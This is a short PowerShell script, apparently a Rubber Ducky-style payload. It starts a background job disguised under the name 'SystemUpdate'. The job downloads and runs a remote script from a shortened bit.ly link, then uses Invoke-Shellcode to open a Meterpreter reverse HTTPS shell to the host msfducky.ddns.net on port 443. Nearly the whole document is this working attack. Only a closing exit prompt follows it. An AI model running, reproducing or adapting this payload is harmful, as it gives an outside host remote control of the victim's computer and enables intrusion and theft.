Start-Job -Name SystemUpdate -Scriptblock {IEX (New-Object Net.WebClient).DownloadString("http://bit.ly/2hGPzSC"); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost msfducky.ddns.net -Lport 443 -Force}

Read-Host -Prompt "Press Enter to exit"
